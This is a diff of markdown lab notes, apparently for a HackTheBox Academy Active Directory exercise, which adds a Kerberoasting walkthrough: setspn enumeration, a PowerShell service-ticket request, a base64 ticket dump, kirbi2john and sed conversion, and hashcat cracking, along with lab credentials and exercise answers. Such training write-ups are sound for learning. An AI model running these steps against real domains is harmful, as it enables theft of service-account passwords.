@@ -178,7 +178,7 @@ Academy_student_AD!
 
 RDP
 ```go
-xfreerdp /v:10.129.52.162 /u:htb-student /p:'Academy_student_AD!' /smart-sizing:3400x2000 /tls-seclevel:+enforce-tlsv1_2
+xfreerdp /v:10.129.53.136 /u:htb-student /p:'Academy_student_AD!' /smart-sizing:3400x2000
 ```
 
 ```go
@@ -186,7 +186,83 @@ xfreerdp /v:10.129.52.162 /u:htb-student /p:'Academy_student_AD!' /smart-sizing:
 ```
 
 ### Question 1: What is the name of the service account with the SPN 'vmware/inlanefreight.local'?
+Answer
+```go
+svc_vmwaresso
+```
+
+Just run the command the name will be at the bottom of the output:
+```go
+setspn.exe -Q */*
+```
+
+### Question 2: Crack the password for this account and submit it as your answer.
+
+Answer:
+```go
+Virtual01
+```
 
 ```go
-
+Add-Type -AssemblyName System.IdentityModel
 ```
+
+```go
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken            -ArgumentList "vmware/inlanefreight.local"
+```
+
+```go
+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
+BnZtd2FyZRsTaW5sYW5lZnJlaWdodC5sb2NhbA==
+```
+
+```go
+cat encoded_file | base64 -d > vmware.kirbi
+```
+
+Extract the Kerberos Ticket
+```go
+python3 kirbi2john.py vmware.kirbi
+```
+
+Modify file for hashcat
+```go
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > vmwarehashcat
+```
+
+Crack the hash
+```go
+hashcat -m 13100 vmwarehashcat /usr/share/wordlists/rockyou.txt
+```
+
